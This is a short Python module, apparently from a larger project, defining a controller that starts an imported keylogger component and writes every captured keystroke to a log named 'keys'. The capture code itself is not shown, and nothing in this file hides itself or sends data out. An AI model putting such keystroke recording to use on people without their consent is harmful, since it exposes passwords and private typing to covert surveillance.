from ..components.keylogger import KeyLogger
from ..loggers import Loggers


class KeyLoggerController:
    def __init__(self):
        self.worker = KeyLogger()
        self.worker.KEY_PRESSED.connect(self, "onKeyPress")
        self.logger = Loggers.getNewLogger("keys")

    def startWorker(self):
        self.worker.start()

    def onKeyPress(self, key):
        self.logger.info(key)